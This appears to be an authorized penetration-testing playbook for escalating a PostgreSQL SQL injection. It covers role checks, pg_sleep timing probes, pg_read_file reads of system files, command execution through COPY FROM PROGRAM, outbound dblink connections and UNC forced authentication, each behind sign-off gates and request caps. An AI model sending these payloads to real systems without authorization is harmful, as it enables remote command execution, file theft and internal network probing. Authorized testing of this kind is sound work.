# PostgreSQL escalation from an injection point

PostgreSQL does not hand out file read, outbound connections or command
execution to whoever lands an injection. Every one of those capabilities is
gated on a role grant, and the grant is checkable with a plain `SELECT`. That
makes this the one dialect where the honest answer to "how bad is it?" can be
obtained read-only, before anything is touched.

Read the whole privilege ladder below before sending a payload. Step 4 is
usually the end of the engagement: proving the role holds
`pg_execute_server_program` proves command execution is reachable without ever
executing a command, and that is already a critical finding.

**Cadence for everything in this file.** Serial, one request at a time, 1.5s
base plus up to 1.5s jitter. Caps per injection point: 25 Stage A requests, 10
timing trials, 5 Stage B requests. No loops over hosts or ports.

---

## Stage A — read-only privilege ladder

Every step here is a `SELECT`. Nothing is created, nothing is written, nothing
leaves the database. Stop at the first step that fails.

```sql
-- 1. Confirm the injection and the dialect. A version string is proof of both.
SELECT version();
SELECT current_setting('server_version');

-- 2. Who are we, and are we already superuser?
SELECT current_user, session_user;
SELECT current_setting('is_superuser');          -- 'on' / 'off'

-- 3. Role membership. This is the whole escalation question, answered read-only.
--    pg_has_role([user name or oid,] role text or oid, privilege text) -> boolean
--    privilege is one of MEMBER, USAGE, SET.
SELECT pg_has_role(current_user, 'pg_read_server_files',      'USAGE') AS can_read_files,
       pg_has_role(current_user, 'pg_write_server_files',     'USAGE') AS can_write_files,
       pg_has_role(current_user, 'pg_execute_server_program', 'USAGE') AS can_exec_program;

-- 4. Is dblink already installed? Do NOT install it (see below).
SELECT extname, extversion FROM pg_extension;
SELECT count(*) FROM pg_proc WHERE proname = 'dblink_connect';
```

The predefined roles are documented verbatim as follows, which is the wording to
quote in the report:

| Role | What PostgreSQL says it allows |
|---|---|
| `pg_read_server_files` | "allows reading files from any location the database can access on the server using `COPY` and other file-access functions." |
| `pg_write_server_files` | "allows writing to files in any location the database can access on the server using `COPY` and other file-access functions." |
| `pg_execute_server_program` | "allows executing programs on the database server as the user the database runs as using `COPY` and other functions which allow executing a server-side program." |

The same page carries the warning that all three "bypass all database-level
permission checks when accessing files directly and they could be used to gain
superuser-level access". A `true` from step 3 plus that sentence is a complete
severity argument. **Stop here and report.** Steps below are Stage B.

### Timing probes, if you need a blind oracle to reach step 1

```sql
-- Delay of 5s, never more than 10s. Serial. Max 10 trials per parameter.
' AND (SELECT 1 FROM pg_sleep(5))::text = '1
'; SELECT pg_sleep(5)--
```

A long `pg_sleep` on a pooled connection holds a backend out of the pool for its
whole duration. Enough concurrent sleeps and the pool is exhausted, which is a
denial of service against real users of a production site. Keep the delay at or
below 10s, run trials one at a time with a gap, and never parallelise.

---

## Stage B — file read

**Gate: explicit written sign-off naming the blast radius (which host, which
paths, which time window). Do not proceed on an implied yes.**

`pg_read_file` is the only file-read primitive here that is a pure `SELECT`. It
creates nothing and deletes nothing, which is why it is the one to ask for.

```sql
-- pg_read_file      (filename text [, offset bigint, length bigint] [, missing_ok boolean]) -> text
-- pg_read_binary_file (same arguments)                                                      -> bytea
-- pg_ls_dir         (dirname text [, missing_ok boolean, include_dot_dirs boolean])         -> setof text
-- pg_stat_file      (filename text [, missing_ok boolean])                                  -> record

-- Canary-wrapped read. Works inside a UNION position; writes nothing.
SELECT '<CANARY>' || pg_read_file('/etc/hostname', 0, 200);

-- Missing-file control: with missing_ok = true this must return NULL.
-- If it returns content, you are reading an error page, not a file.
SELECT '<CANARY>' || coalesce(pg_read_file('/etc/nope_<rand>', 0, 200, true), 'NULLCTL');
```

Generate `<CANARY>` per attempt, for example
`CANARY="PGSQ$(head -c8 /dev/urandom | od -An -tx1 | tr -d ' \n')"`, and save the
response body for an unmodified request as the baseline first. Confirmed file
read requires the exact canary echoed back **plus** file content absent from the
baseline. A canary with no content is a reflection. Content with no canary is a
WAF or error page.

Path restriction worth knowing before the report is written: without superuser or
`pg_read_server_files`, these functions reach only files inside the cluster
directory and `log_directory`. With the role, any path the server process can
read is in scope, including `pg_authid`. That distinction is the difference
between an informational finding and a critical one.

### Capabilities to document but not execute

These are real and belong in the impact paragraph. They are listed here so the
write-up is accurate, not so they get run.

- **`COPY tmp FROM '/etc/passwd'`** reads a server-side file into a table
  (superuser or `pg_read_server_files`). It needs a table to exist and `INSERT`
  on it, so it is a state change, not a read. `COPY` splits on tab by default,
  so single-column files need `DELIMITER E'\x07'` or similar. Prefer
  `pg_read_file`.
- **`SELECT lo_import('/etc/passwd')`** imports a file as a large object and
  returns its OID, then `lo_get(<oid>)` returns the bytes. The import leaves a
  persistent large object behind, and removing it needs `lo_unlink`, which is a
  delete. Do not run either. PostgreSQL states that server-side
  `lo_import`/`lo_export` "read and write files in the server's file system,
  using the permissions of the database's owning user. Therefore, by default
  their use is restricted to superusers."
- **`lo_export`** and **`COPY ... TO`** write files. Never send them. A write to
  a live path can overwrite application code or configuration, and
  PostgreSQL's own documentation notes a holder of these privileges "could
  easily parlay them into becoming superuser (for example by rewriting server
  configuration files)".

---

## Stage B — command execution via `COPY ... FROM PROGRAM`

**Gate: explicit written RCE-attempt sign-off, with the blast radius named.**

```sql
COPY table_name [ ( column_name [, ...] ) ]
    FROM PROGRAM 'command'
    [ [ WITH ] ( option [, ...] ) ]
    [ WHERE condition ]
```

Requires superuser or `pg_execute_server_program`, which step 3 already told
you. The command runs through a shell as the operating-system user the server
runs as. `COPY` also needs `INSERT` on the target table, which means this
primitive cannot be made read-only: something has to receive the output.

The least invasive shape uses a randomly named temporary table, so no `DROP` is
needed and the object disappears with the session:

```sql
-- Needs stacked queries. If the driver rejects multiple statements, stop at the
-- privilege proof from Stage A step 3 and report that instead.
; CREATE TEMP TABLE cbh_<rand>(t text);
  COPY cbh_<rand> FROM PROGRAM 'echo <CANARY>; id';
  SELECT t FROM cbh_<rand>;
```

Confirmed RCE requires the exact `<CANARY>` echoed back **and** `uid=` output
that is absent from the saved Stage A baseline body. A bare `uid=` with no
canary echo is not confirmation.

**Blast radius to state in the sign-off request.** A temporary table lives in a
temp schema that is searched ahead of the regular search path. If `<rand>`
collides with a name the application queries, every subsequent query on that
pooled backend resolves to your empty table instead of the real one, for as long
as the session lives. Use a long random suffix, and treat a pooled production
connection as a reason to decline rather than a detail.

Note for the write-up: `COPY ... FROM PROGRAM` was assigned
[CVE-2019-9193](https://nvd.nist.gov/vuln/detail/CVE-2019-9193) and the project
rejects that framing, because the feature behaves as documented and is gated on
a privilege. Argue the finding from the privilege grant, not from the CVE.

### Never send these

- `CREATE EXTENSION` of any kind. It is a persistent schema change to the
  target database.
- A compiled C extension, or `CREATE FUNCTION ... LANGUAGE C`. That needs a file
  write first and lands in post-exploitation, which this bundle excludes.
- `COPY ... TO PROGRAM`, which pipes table data out to a shell command.
- Any loop over ports or hosts. Mass scanning is out of scope.

---

## dblink: an SSRF-shaped primitive that touches other hosts

`dblink` turns the database into an HTTP-less request origin inside the network
the database sits in. That is the same primitive class as `hunt-ssrf`, and the
same authorization logic applies: **the target of a `dblink` connection is a
different host from the one in scope for the SQL injection. It is a separate
authorization question, and it needs its own written answer before a single
connection is attempted.** An in-scope web application does not put the
database's neighbours in scope.

Preconditions, all checkable read-only:

- The extension must already be installed. `dblink` is **not** in PostgreSQL's
  trusted-extension list, so `CREATE EXTENSION dblink;` requires a superuser.
  **Do not install it.** If step 4 of Stage A came back empty, this path is
  closed, and that is the finding.
- `dblink_connect` is restricted for non-superusers. The documentation states:
  "Only superusers may use `dblink_connect` to create connections that use
  neither password authentication, SCRAM pass-through, nor GSSAPI-authentication."
  A non-superuser attempt against a server that does not request a password
  returns `ERROR: password is required`.
- `dblink_connect_u` is the unrestricted variant and is "initially installed with
  all privileges revoked from `PUBLIC`, making it un-callable except by
  superusers." If a non-superuser can call it, an administrator granted it
  explicitly, and that grant is itself worth reporting.

```sql
-- Signatures (per the dblink module documentation)
dblink_connect(connstr text) RETURNS text
dblink_connect(connname text, connstr text) RETURNS text
dblink_connect_u(connstr text) RETURNS text
dblink(connstr text, sql text [, fail_on_error boolean]) RETURNS SETOF record
```

### What to actually do, once the second authorization exists

One connection, to a host **you own**, with the canary in the connection string
so the receiving end can attribute it:

```sql
-- Stage B, separate sign-off. ONE attempt. Your listener, your host.
SELECT dblink_connect('host=<YOUR-HOST> port=5432 user=<CANARY> dbname=<CANARY> connect_timeout=5');
```

Proof is the inbound connection arriving at your listener carrying the canary,
plus the source IP. That is an outbound-connectivity finding, and it is enough.

### The port oracle, and why not to build it

`dblink_connect` returns different errors for a closed port ("could not connect
to server: Connection refused"), a filtered port ("timeout expired") and a
TLS-speaking service ("received invalid response to SSL negotiation"). That is a
genuine oracle, and iterating it is a port scan of a third-party host from
inside the perimeter. Do not write that loop. Demonstrate the differential
against **one** host and port that the sign-off names, and describe the
generalisation in prose.

---

## Forced authentication over UNC paths

On a Windows PostgreSQL server, a server-side `COPY` naming a UNC path makes the
service account attempt SMB authentication to that path. The in-scope finding is
exactly this: **outbound SMB from the database host is reachable and
database-side forced authentication is possible.** End the chain there, describe
the impact, and stop. Capturing or relaying the resulting authentication is
excluded from this bundle. Note also that the `COPY` form requires a table and
`INSERT` on it, so it is a state change and needs the same Stage B gate as
anything else here.

---

## Root causes to name in the report

1. The application's database role holds `pg_read_server_files` or
   `pg_execute_server_program` because someone needed a one-off import and never
   revoked it.
2. The application connects as the database owner or as a superuser, usually
   because the framework's first-run migration needed it.
3. `dblink` was installed years ago for a reporting job that no longer exists,
   and the extension stayed.
4. `pg_hba.conf` trusts loopback connections without a password, which makes any
   `dblink` or local-socket path a privilege escalation inside the database. The
   active file path is reported by `SHOW hba_file;`.

---

## Sources

- PostgreSQL documentation: [`COPY`](https://www.postgresql.org/docs/current/sql-copy.html),
  [predefined roles](https://www.postgresql.org/docs/current/predefined-roles.html),
  [system information functions](https://www.postgresql.org/docs/current/functions-info.html),
  [server-side file functions](https://www.postgresql.org/docs/current/functions-admin.html),
  [large objects](https://www.postgresql.org/docs/current/lo-funcs.html),
  [`dblink`](https://www.postgresql.org/docs/current/dblink.html),
  [`dblink_connect`](https://www.postgresql.org/docs/current/contrib-dblink-connect.html),
  [`dblink_connect_u`](https://www.postgresql.org/docs/current/contrib-dblink-connect-u.html),
  [supplied modules and trusted extensions](https://www.postgresql.org/docs/current/contrib.html).
- [CVE-2019-9193](https://nvd.nist.gov/vuln/detail/CVE-2019-9193) for the
  `COPY ... FROM PROGRAM` disputed-CVE framing.
- Coverage of the technique list was checked against the HackTricks
  `pentesting-web/sql-injection/postgresql-injection` pages
  (<https://github.com/HackTricks-wiki/hacktricks>, CC BY-NC 4.0), used as a
  checklist only. All prose, privilege mapping, staging and safety guidance here
  is written against the PostgreSQL documentation linked above.
